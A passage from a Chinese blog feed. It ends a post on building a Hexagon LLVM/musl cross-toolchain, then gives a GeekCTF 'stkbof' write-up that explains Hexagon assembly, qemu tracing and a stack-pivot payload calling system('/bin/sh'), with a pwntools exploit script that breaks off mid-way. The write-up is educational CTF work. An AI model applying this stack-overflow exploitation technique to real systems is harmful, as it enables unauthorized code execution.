class="keyword">ENV</span> PATH=<span class="string">&quot;/opt/zig-linux-x86_64-0.11.0:$PATH&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install common build utilities</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive apt install -yy \</span></span><br><span class="line"><span class="language-bash">apt-transport-https ca-certificates \</span></span><br><span class="line"><span class="language-bash">eatmydata software-properties-common wget gpgv2 unzip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata \</span></span><br><span class="line"><span class="language-bash">add-apt-repository ppa:deadsnakes/ppa &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata \</span></span><br><span class="line"><span class="language-bash">wget --quiet https://ziglang.org/download/0.11.0/zig-linux-x86_64-0.11.0.tar.xz &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">tar xf ./zig-linux-x86_64-0.11.0.tar.xz --directory /opt &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">wget https://apt.llvm.org/llvm.sh &amp;&amp; \</span></span><br><span class="line"><span class="language-bash"><span class="built_in">chmod</span> +x ./llvm.sh &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">bash -x ./llvm.sh  <span class="variable">$&#123;HOST_CLANG_VER&#125;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">wget https://github.com/ninja-build/ninja/releases/download/v1.10.2/ninja-linux.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">unzip -d /usr/local/bin ninja-linux.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">update-alternatives --install /usr/bin/ninja ninja /usr/local/bin/ninja 1 --force</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget -O - https://apt.kitware.com/keys/kitware-archive-latest.asc 2&gt;/dev/null |  apt-key add - &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">apt-add-repository <span class="string">&#x27;deb https://apt.kitware.com/ubuntu/ focal main&#x27;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> update-alternatives --install /usr/bin/clang++ clang++ /usr/bin/clang++-<span class="variable">$&#123;HOST_CLANG_VER&#125;</span> 100 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">update-alternatives --install /usr/bin/clang clang /usr/bin/clang-<span class="variable">$&#123;HOST_CLANG_VER&#125;</span> 100 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata \</span></span><br><span class="line"><span class="language-bash">apt install -y --no-install-recommends \</span></span><br><span class="line"><span class="language-bash">bison \</span></span><br><span class="line"><span class="language-bash">cmake \</span></span><br><span class="line"><span class="language-bash">flex \</span></span><br><span class="line"><span class="language-bash">rsync \</span></span><br><span class="line"><span class="language-bash">wget \</span></span><br><span class="line"><span class="language-bash">build-essential \</span></span><br><span class="line"><span class="language-bash">python-is-python3 \</span></span><br><span class="line"><span class="language-bash">python3.8 \</span></span><br><span class="line"><span class="language-bash">python3.8-venv \</span></span><br><span class="line"><span class="language-bash">curl \</span></span><br><span class="line"><span class="language-bash">xz-utils \</span></span><br><span class="line"><span class="language-bash">zstd \</span></span><br><span class="line"><span class="language-bash">ca-certificates \</span></span><br><span class="line"><span class="language-bash">ccache \</span></span><br><span class="line"><span class="language-bash">git \</span></span><br><span class="line"><span class="language-bash">software-properties-common \</span></span><br><span class="line"><span class="language-bash">bc \</span></span><br><span class="line"><span class="language-bash">ninja-build \</span></span><br><span class="line"><span class="language-bash">cpio \</span></span><br><span class="line"><span class="language-bash">python3-psutil \</span></span><br><span class="line"><span class="language-bash">unzip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cat</span> /etc/apt/sources.list | sed <span class="string">&quot;s/^deb\ /deb-src /&quot;</span> &gt;&gt; /etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata \</span></span><br><span class="line"><span class="language-bash">apt build-dep -yy --arch-only qemu clang python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># From env.sh</span></span><br><span class="line"><span class="keyword">ARG</span> QEMU_REPO</span><br><span class="line"><span class="keyword">ARG</span> QEMU_REF=hexagon-sysemu-<span class="number">04</span>-oct-<span class="number">2024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> ARTIFACT_BASE</span><br><span class="line"><span class="keyword">ARG</span> ARTIFACT_TAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> VER <span class="number">19.1</span>.<span class="number">5</span></span><br><span class="line"><span class="keyword">ENV</span> TOOLCHAIN_INSTALL /usr/local/clang+llvm-$&#123;VER&#125;-cross-hexagon-unknown-linux-musl/</span><br><span class="line"><span class="keyword">ENV</span> ROOT_INSTALL /usr/local/hexagon-unknown-linux-musl-rootfs</span><br><span class="line"><span class="keyword">ENV</span> MAKE_TARBALLS <span class="number">1</span></span><br><span class="line"><span class="comment">#ENV HOST_LLVM_VERSION 10</span></span><br><span class="line"><span class="comment">#ENV CMAKE_VER 3.16.6</span></span><br><span class="line"><span class="comment">#ENV CMAKE_URL https://github.com/Kitware/CMake/releases/download/v3.16.6/cmake-3.16.6-Linux-x86_64.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LLVM_SRC_URL https://github.com/llvm/llvm-project/archive/llvmorg-$&#123;VER&#125;.tar.gz</span><br><span class="line"><span class="keyword">ENV</span> LLVM_TESTS_SRC_URL https://github.com/llvm/llvm-test-suite/archive/llvmorg-$&#123;VER&#125;.tar.gz</span><br><span class="line"><span class="keyword">ENV</span> MUSL_SRC_URL https://github.com/quic/musl/archive/d125203fcb134febcde6ca32181554560b67c790.tar.gz</span><br><span class="line"><span class="keyword">ENV</span> HEXMVM_SRC_URL https://github.com/quic/hexagonMVM/archive/v0.<span class="number">1.1</span>.tar.gz</span><br><span class="line"><span class="keyword">ENV</span> LINUX_SRC_URL https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-<span class="number">6.7</span>.<span class="number">11</span>.tar.xz</span><br><span class="line"><span class="keyword">ENV</span> BUSYBOX_SRC_URL https://busybox.net/downloads/busybox-<span class="number">1.36</span>.<span class="number">1</span>.tar.bz2</span><br><span class="line"><span class="keyword">ENV</span> BUILDROOT_SRC_URL https://github.com/quic/buildroot/archive/hexagon-<span class="number">2024.11</span>.<span class="number">26</span>.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#ENV PYTHON_SRC_URL https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tar.xz</span></span><br><span class="line"><span class="comment">#ADD get-host-clang-cmake-python.sh /root/hexagon-toolchain/get-host-clang-cmake-python.sh</span></span><br><span class="line"><span class="comment">#RUN cd /root/hexagon-toolchain &amp;&amp; ./get-host-clang-cmake-python.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> test-suite-patches /root/hexagon-toolchain/test-suite-patches</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> get-src-tarballs.sh /root/hexagon-toolchain/get-src-tarballs.sh</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> *.cmake /root/hexagon-toolchain/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./get-src-tarballs.sh <span class="variable">$&#123;PWD&#125;</span> <span class="variable">$&#123;TOOLCHAIN_INSTALL&#125;</span>/manifest</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> test_init/test_init.c test_init/Makefile /root/hexagon-toolchain/test_init/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> IN_CONTAINER <span class="number">1</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> build-toolchain.sh /root/hexagon-toolchain/build-toolchain.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./build-toolchain.sh <span class="variable">$&#123;ARTIFACT_TAG&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> build-buildroot.sh /root/hexagon-toolchain/build-buildroot.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./build-buildroot.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> TEST_TOOLCHAIN=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> build-rootfs.sh /root/hexagon-toolchain/build-rootfs.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./build-rootfs.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> test-toolchain.sh /root/hexagon-toolchain/test-toolchain.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./test-toolchain.sh</span></span><br></pre></td></tr></table></figure><h2 id="开箱即用"><a href="#开箱即用" class="headerlink" title="开箱即用"></a>开箱即用</h2><p>目前（2024.12.12）release最高版本是19.1.2，musl的版本对应的是1.2.5，clang版本为19。这里以linux x86_64版本为例。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.codelinaro.org/artifactory/codelinaro-toolchain-for-hexagon/19.1.2/clang+llvm-19.1.2-cross-hexagon-unknown-linux-musl_x86_64-linux-musl.tar.xz</span><br><span class="line">sudo tar xf clang+llvm-19.1.2-cross-hexagon-unknown-linux-musl_x86_64-linux-musl.tar.xz -C /path/to/install</span><br><span class="line">export PATH=/path/to/your/clang+llvm-19.1.2-cross-hexagon-unknown-linux-musl/x86_64-linux-musl/bin:$PATH</span><br></pre></td></tr></table></figure><p>解压过程有点久。整个包大小解压后在29G左右，请预留好空间。接下来就可以正常编译程序了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexagon-linux-musl-clang -o ./example example.c</span><br></pre></td></tr></table></figure><p>运行的时候如果提示找不到ld，可以将interpreter patchelf到你的<code>path/to/your/clang+llvm-19.1.2-cross-hexagon-unknown-linux-musl/x86_64-linux-musl/target/hexagon-unknown-linux-musl/lib/ld-musl-hexagon.so.1</code>.</p><p>或者你将解压出来的lib文件夹下的libc.so通过软链接的方式链接到&#x2F;lib文件夹下也可以。但是如果是cpp程序，那动态链接库就有点多了，这时候就需要将解压出来的lib文件夹设置为LD路径。这个网上有很多教程。</p><p>顺带一提，可以通过<a href="https://blog.csdn.net/weixin_43749411/article/details/108521312#:~:text=export%E6%96%B9%E5%BC%8F%E5%9C%A8%E9%87%8D%E5%90%AF%E5%90%8E%E5%A4%B1%E6%95%88%EF%BC%8C%E6%83%B3%E8%A6%81%E6%B0%B8%E4%B9%85%E6%B7%BB%E5%8A%A0%E5%8F%AF%E4%BB%A5vim,%2Fetc%2Fbashrc%EF%BC%8C%E4%BF%AE%E6%94%B9%E5%85%B6%E4%B8%AD%E7%9A%84LD_LIBRARY_PATH%E5%8F%98%E9%87%8F%E3%80%82%20%E4%BE%8B%E5%A6%82%EF%BC%9ALD_LIBRARY_PATH%3D%24LD_LIBRARY_PATH%3A%2Fopt%2Fau1200%2Fbin%E3%80%82">修改<code>~/.bashrc</code>文件</a>的方式使得PATH永久化。export来设置路径是一次性的。</p><h2 id="musl调试符号构建"><a href="#musl调试符号构建" class="headerlink" title="musl调试符号构建"></a>musl调试符号构建</h2><p>现在<a href="https://musl.libc.org/">官网</a>下载对应版本源码。然后进入root用户，否则编译到后面他才会告诉你路径没有权限访问。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/musl CFLAGS=&#x27;-O2 -v&#x27; --enable-debug &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>等编译完成。这样在gdb调试musl程序的时候就会有符号了。</p><h2 id="波折"><a href="#波折" class="headerlink" title="波折"></a>波折</h2><p>算了这部分懒得写了</p>]]></content>
      
      
      <categories>
          
          <category> hexagon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
            <tag> hexagon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『2024GeekCTF』stkbof-初识hexagon架构</title>
      <link href="/2024/2024geekctf-stkbof/"/>
      <url>/2024/2024geekctf-stkbof/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在找点新的东西学，翻着翻着找到这道题，稀罕物，所以想着学一学。hexagon架构的pwn题很少见，网上资料也很少，好在题目附件给了源码，可以对照着汇编来学习，类比一下应该不算太难学。网上关于这道题的解析也是少之又少，就算有也很不详细。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h3><p>一共需要准备两样东西：IDA对于hexagon架构处理器反编译的<a href="https://github.com/n-o-o-n/idp_hexagon/releases/download/v5.4/hexagon-ida83-v5.4.7z">插件</a>和qemu-hexagon，将题目给出的libc.so软链接到&#x2F;lib目录下作ld。</p><h3 id="IDA的hexagon反编译插件"><a href="#IDA的hexagon反编译插件" class="headerlink" title="IDA的hexagon反编译插件"></a>IDA的hexagon反编译插件</h3><p>插件很好找：hexagon架构处理器反编译的插件，解压之后dll放到IDA8.3（及以下版本）的procs文件夹内即可。需要注意的是这个程序是32位的，这个插件也只为32位服务，因此尽管是8.3版本，也要单独打开IDA.exe才能识别到这个hexagon的插件。</p><h3 id="qemu-hexagon"><a href="#qemu-hexagon" class="headerlink" title="qemu-hexagon"></a>qemu-hexagon</h3><p>qemu这里就比较难受了。qemu-user就不用说了肯定得有的，但是实际运行之后发现还少点东西：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-hexagon: Could not open &#x27;/lib/ld-musl-hexagon.so.1&#x27;: No such file or directory</span><br></pre></td></tr></table></figure><p>本来我想仿照arm或者mips架构去找gnu包下载，忽然想到不对劲，高通本身就有一套sdk，没道理继续使用gcc的。事实就是在ubuntu中用apt search了一下hexagon，确实就没几个相关的包。然后去quic（高通的github）翻了一会，找到了<a href="https://github.com/quic/toolchain_for_hexagon">hexagon的toolchain</a>，release中有针对x86_64linux量身打造的hexagon musl前后端编译工具。5.9G，没办法那也得下下来看看是不是真的能派上用场。然后这玩意解压出来有50个G……在target&#x2F;lib文件夹下可以找到<code>ld-musl-hexagon.so.1</code>，把他cp到&#x2F;lib里，然后程序终于可以运行了。。。然后后面发现泄露出来的libc地址怎么也和题目给出来的libc.so的偏移对不上号。如果把解压出来的libc.so替换附件给的libc那就没问题了，所以怀疑是ld和libc版本不一样（因为我下载的是最新版的release）。然后我发现解压的文件中libc和ld文件大小一样，计算发现md5值也是一样的，这也就意味着我只要把libc.so软链接到lib文件夹就可以了，根本不用去下载toolchain。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /path/to/your/libc.so /lib/ld-musl-hexagon.so.1</span><br></pre></td></tr></table></figure><h3 id="Docker的拉取问题"><a href="#Docker的拉取问题" class="headerlink" title="Docker的拉取问题"></a>Docker的拉取问题</h3><p>在解决这个问题之后，我们先来说说dockerfile的问题。这道题给的docker使用fedora构建，但是构建的时候元数据可以下载下来，但是主要的包却死活拉不下来。解决办法是，从dockerhub的标签进到github仓库，找到<a href="https://github.com/fedora-cloud/docker-brew-fedora/blob/2317ae452755c2e2107df65560bce2772b1b45b9/x86_64/fedora-39-x86_64.tar.xz">这个包</a>然后通过浏览器下载下来，与它在同一目录下的dockerfile也下载下来，然后在本地利用这个dockerfile构建fedora的镜像。这样一来，其他使用fedora:39的docker就可以直接从本地拉取。</p><h2 id="部分汇编解析"><a href="#部分汇编解析" class="headerlink" title="部分汇编解析"></a>部分汇编解析</h2><p>还是老样子，几乎找不到资料，好在题目给出了源码，我们可以结合源码分析汇编指令。虽然有点小题大做，但是网上可以下载到高通的<a href="https://origin-developer.qualcomm.com/qfile/33880/80-n2040-36_b_hexagon_v62_prog_ref_manual.pdf">开发者手册</a>。这个开发者手册可以解决一些网上很难获得答案的问题。</p><p>装好插件之后打开IDA，发现hexagon的指令风格一眼看过去和arm非常像，所以就算不用找开发手册其实也能看个大概。</p><ul><li>mewm()类似于x86汇编中的[]，解引用。后面那个m有可能是h，代表halfword；d表示doubleword…</li><li>{}括起来的语句会被并发执行，hexagon最多支持四指令并发</li><li>一共有32个32位通用寄存器，R0-R31。存在寄存器对，可以当做64位寄存器使用，如R0和R1可以合并成R1:0（R1和R2不行）。这个很有意思。</li><li>R29-R31是别名寄存器。R29是SP，R30是FP，R31是LR寄存器。如果接触过ARM汇编的话，这下你就该感叹：这下看懂了。SP是栈顶寄存器，FP是栈（底）寄存器，LR是储存返回地址的寄存器。</li><li>有32个控制寄存器，我们需要重点关注的是PC寄存器（别名C9）和LC、SA系列寄存器。后者是拿来给硬件循环计数用的。</li><li>栈结构与我们熟知的x86、arm没什么区别。但是开辟栈和销毁的方式不太一样。有类似canary的保护机制，还有加密返回地址的保护机制，key是存在专门的寄存器里面的。不过这道题没有涉及。</li><li>hexagon用allocframe开辟栈帧：LR压栈，FP压栈，SP减去一定数值向低地址开辟，FP设置成指向旧FP的指针。deallocframe&#x2F;dealloc_return用于销毁栈帧&#x2F;销毁栈帧并返回，从栈底取回FP和LR。说白了就是和x86或者arm一样的。</li><li>立即数和一些存放数据的寄存器前面会加一些井号，##表示必须用32位偏移量，#是必须不能用32位偏移量，没加井号意味着必要时才用32为偏移量。</li><li>函数传参按照寄存器编号顺序来使用，例如有四个参数就用R0-R3寄存器。</li></ul><p><img src="https://c-lby.top/images/2024geekctf-stkbof/hexagon%E6%A0%88%E7%BB%93%E6%9E%84.png" alt="hexagon栈结构"></p><p><img src="https://c-lby.top/images/2024geekctf-stkbof/hexagon%E6%A0%88%E5%BC%80%E8%BE%9F%E4%B8%8E%E9%94%80%E6%AF%81.png" alt="hexagon栈开辟与销毁"></p><h2 id="题目分析-动调"><a href="#题目分析-动调" class="headerlink" title="题目分析&amp;动调"></a>题目分析&amp;动调</h2><h3 id="qemu-hexagon调试方法"><a href="#qemu-hexagon调试方法" class="headerlink" title="qemu-hexagon调试方法"></a>qemu-hexagon调试方法</h3><p>先讲讲动调的问题。原本我尝试使用gdb-multiarch来调试，但是发现无论如何都会报错，估计是gdb-multiarch的问题，应该是有解决办法的但暂时懒得管了，先放一边。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line">ERROR:../../target/hexagon/gdbstub.c:33:hexagon_gdb_read_register: code should not be reached</span><br><span class="line">Bail out! ERROR:../../target/hexagon/gdbstub.c:33:hexagon_gdb_read_register: code should not be reached</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>翻了翻<a href="https://www.qemu.org/docs/master/user/main.html">qemu的文档</a>发现qemu是可以记录一些程序运行日志的。<code>-d</code>参数可以选择记录的内容，<code>-D</code>选择log输出的文件，<code>-dfilter</code>约束记录的指令地址范围。</p><p>qemu翻译执行指令并不是逐条指令进行的，而是会一坨执行翻译到一个TB（translation block）中，再以TB为单位去执行。所以qemu -d记录的日志也会以TB为单位呈现。根据记录下来的日志找到的规律，TB通常会以call、return之类的跳转语句划分。简单来说就是，正常来讲我们没法看到每一步的CPU上下文情况。</p><p>但是qemu也留了一手，-d参数中加上nochain，加上<code>-singlestep</code>参数就能看到逐指令的上下文了，但是这样的执行速度会下降许多，如果是大型项目调试的话，并不建议这么做。这里涉及到<a href="https://wangzhou.github.io/qemu%E8%B7%9F%E8%B8%AACPU%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E9%80%BB%E8%BE%91/">qemu trace的原理</a>，这里就不深入探究了，以后有机会再展开。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-hexagon -L libc -d in_asm,exec,cpu,page,nochain -singlestep -dfilter 0x20400+0xc0 -strace -D ./log ./chall</span><br></pre></td></tr></table></figure><p>这是我的调试运行命令，这样log日志中就会存有从0x20400到0x204c0（stkbof和main函数范围）逐行指令执行前的CPU寄存器情况，并且记录系统调用情况与其返回值。page参数会在log开头记录程序布局情况，但是有且仅能看到各地址段的权限情况，没法得知哪个段对应什么用处。</p><p>如果想调试自己的payload的，可以在脚本中写process，这样就会从脚本记录日志了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&#x27;qemu-hexagon&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-singlestep&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20400+0xc0&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./chall&#x27;</span>])</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目就是给了个栈溢出可以劫持返回地址，然后我们得想办法getshell。不同于平常的题目，这道题我们看不到任何pop&#x2F;push语句，也就是说我们想要传参，得考虑利用其他gadget。</p><h4 id="泄露栈-libc地址"><a href="#泄露栈-libc地址" class="headerlink" title="泄露栈&#x2F;libc地址"></a>泄露栈&#x2F;libc地址</h4><p>众所周知qemu模拟执行一般情况下并没有aslr这种东西，chall程序本身也没开PIE保护，那就意味着栈地址、libc地址我们都可以直接利用调试泄露出来，然后一直用。我们运行调试命令，程序结束后我们查看log，找到执行到stkbof的部分，可以看到一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6275 read(0,0x4080ebe0,272) = 2</span><br></pre></td></tr></table></figure><p>这是qemu记录下来的系统调用记录，6275是进程pid，等于号后面的是这个系统调用的返回值。显而易见输入点是0x4080ebe0，这就是我们泄露出来的栈地址。<strong>请注意，不同环境下这个地址可能会改变。不同于题目运行于fedora，此log是基于ubuntu22的qemu运行的。</strong></p><p>因为程序调用动态链接库的函数在plt和got中转一手，并且我们约束了log范围，所以仅靠此时的log没法很直观的看出来libc地址。我们注意到plt表处的指令从got表取出了解析好的libc地址，储存在r28寄存器中并jumpr执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.plt:00020510 // int puts(const char *s)</span><br><span class="line">.plt:00020510 puts:                                   // CODE XREF: main+8C↑p</span><br><span class="line">.plt:00020510                 &#123; r14 = add(pc, ##off_405D4@pcrel) &#125;</span><br><span class="line">.plt:00020518                 &#123; r28 = memw(r14) &#125;</span><br><span class="line">.plt:0002051C                 &#123; jumpr r28 &#125;</span><br><span class="line">.plt:0002051C // End of function puts</span><br></pre></td></tr></table></figure><p>那也就是说在执行puts后r28寄存器应该会残留有puts的libc地址。我们在log找到相应的位置，查看r28寄存器的值：<code>r28 = 0x3ffa7c40</code>，同时我们看到libc.so中puts函数的偏移是0xD7C40，那么就可以得到libc的基址是0x3FED0000。</p><h4 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h4><p>有了libc地址，system和binsh地址都会有了，现在要考虑如何给system传参。这里没有pop R0这样的gadget，只有给R0赋值的语句，考虑通过栈迁移的方式，利用栈给寄存器传参。0x204b4处有个取FP-8处数据赋值给R0的指令，并且紧接着就是return（插播一句，估计这个地方原本是利用R0作为函数返回值传参寄存器了）。return之后，程序会继续从新FP+4的位置开始执行。因此有以下思路：</p><ol><li>劫持FP为0x4080ebe0（输入点），LR为ret，那么接下来程序会从0x4080ebe4开始执行。并且因为刚才总共是执行了两次return，所以此时FP应该是0x4080ebe0内的数据。</li><li>因为我们需要从FP-8来取值，因此我们需要控制FP为栈地址。这里写<code>0x4080ebe0+0x10</code>，那么<code>0x4080ebe0+0x10-0x8</code>处要写binsh的libc地址。</li><li>又一次return后，程序将从<code>0x4080ebe0+0x14</code>处执行，所以这个地方要写上system的libc地址。</li></ol><p>综上可以得到payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stack = <span class="number">0x4080ebe0</span></span><br><span class="line">libc_base = <span class="number">0x3FED0000</span></span><br><span class="line">gadget1 = <span class="number">0x204b4</span>  <span class="comment"># &#123; r0 = memw(fp + #var_8) &#125; &#123; dealloc_return &#125;</span></span><br><span class="line">ret = <span class="number">0x2041c</span>  <span class="comment"># &#123; dealloc_return &#125;</span></span><br><span class="line"></span><br><span class="line">payload = p32(stack + <span class="number">0x10</span>)</span><br><span class="line">payload += p32(gadget1)</span><br><span class="line">payload += p32(libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))) + p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p32(stack)+p32(ret)</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&#x27;qemu-hexagon&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-singlestep&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20400+0xc0&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./chall&#x27;</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x4080ebe0</span></span><br><span class="line">libc_base = <span class="number">0x3FED0000</span></span><br><span class="line">gadget1 = <span class="number">0x204b4</span>  <span class="comment"># &#123; r0 = memw(fp + #var_8) &#125; &#123; dealloc_return &#125;</span></span><br><span class="line">ret = <span class="number">0x2041c</span>  <span class="comment"># &#123; dealloc_return &#125;</span></span><br><span class="line"><span class="comment"># success(hex(libc_base+0x0012279))</span></span><br><span class="line"></span><br><span class="line">payload = p32(stack + <span class="number">0x10</span>)</span><br><span class="line">payload += p32(gadget1)</span><br><span class="line">payload += p32(libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))) + p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(libc_base + 